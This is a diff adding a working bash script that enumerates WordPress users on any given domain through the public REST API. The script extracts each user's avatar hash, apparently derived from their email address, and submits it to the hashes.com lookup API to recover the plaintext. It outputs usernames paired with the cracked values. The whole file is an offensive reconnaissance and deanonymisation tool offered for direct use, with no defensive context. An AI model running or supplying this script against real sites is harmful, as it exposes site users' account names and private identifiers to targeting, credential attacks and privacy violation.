@@ -1,0 +1,91 @@
+#!/bin/bash
+
+# WordPress User Enumeration and Hash Lookup Script
+# Usage: ./wp_user_enum.sh <domain>
+
+DOMAIN="$1"
+
+if [ -z "$DOMAIN" ]; then
+  echo "Usage: $0 <domain>"
+  echo "Example: $0 mywordpresssite.com"
+  exit 1
+fi
+
+if [ -z "$HASHES_API_KEY" ]; then
+  echo "[-] Error: HASHES_API_KEY environment variable is not set"
+  echo "[-] Please set your hashes.com API key: export HASHES_API_KEY='your_api_key'"
+  exit 1
+fi
+
+test_url() {
+  local url="$1"
+  response=$(curl -s -w "%{http_code}" "$url/wp-json/wp/v2/users" -o /tmp/wp_response.json)
+  http_code="${response: -3}"
+
+  if [ "$http_code" = "200" ]; then
+    if jq -e '. | length > 0' /tmp/wp_response.json >/dev/null 2>&1; then
+      return 0
+    fi
+  fi
+
+  return 1
+}
+
+lookup_hash() {
+  local hash="$1"
+  response=$(curl -s -X POST \
+    -H "Content-type: multipart/form-data" \
+    -F "key=$HASHES_API_KEY" \
+    -F "hashes[]=$hash" \
+    "https://hashes.com/en/api/search")
+
+  if echo "$response" | jq -e '.founds | length > 0' >/dev/null 2>&1; then
+    plaintext=$(echo "$response" | jq -r '.founds[0].plaintext // empty')
+    if [ -n "$plaintext" ]; then
+      echo "$plaintext"
+    else
+      echo "not_found"
+    fi
+  else
+    echo "not_found"
+  fi
+}
+
+CLEAN_DOMAIN=$(echo "$DOMAIN" | sed 's|^https\?://||')
+
+BASE_URL="https://$CLEAN_DOMAIN"
+if ! test_url "$BASE_URL"; then
+  # fall back to http
+  BASE_URL="http://$CLEAN_DOMAIN"
+  if ! test_url "$BASE_URL"; then
+    echo '{"error": "Unable to access WordPress API"}' >&2
+    rm -f /tmp/wp_response.json
+    exit 1
+  fi
+fi
+
+{
+  jq -c '.[]' /tmp/wp_response.json | while read -r user; do
+    username=$(echo "$user" | jq -r '.name')
+    slug=$(echo "$user" | jq -r '.slug')
+    avatar_24=$(echo "$user" | jq -r '.avatar_urls."24" // empty')
+
+    if [ -n "$avatar_24" ]; then
+      hash=$(echo "$avatar_24" | grep -oP 'avatar/\K[a-f0-9]{64}')
+
+      if [ -n "$hash" ]; then
+        plaintext=$(lookup_hash "$hash")
+        jq -n --arg user "$username" --arg slug "$slug" --arg hash "$hash" --arg plaintext "$plaintext" \
+          '{user: $user, username: $slug, hash: $hash, plaintext: $plaintext}'
+      else
+        jq -n --arg user "$username" --arg slug "$slug" \
+          '{user: $user, username: $slug, hash: "not_found", plaintext: "not_found"}'
+      fi
+    else
+      jq -n --arg user "$username" --arg slug "$slug" \
+        '{user: $user, username: $slug, hash: "no_avatar", plaintext: "no_avatar"}'
+    fi
+  done
+} | jq -s '.'
+
+rm -f /tmp/wp_response.json
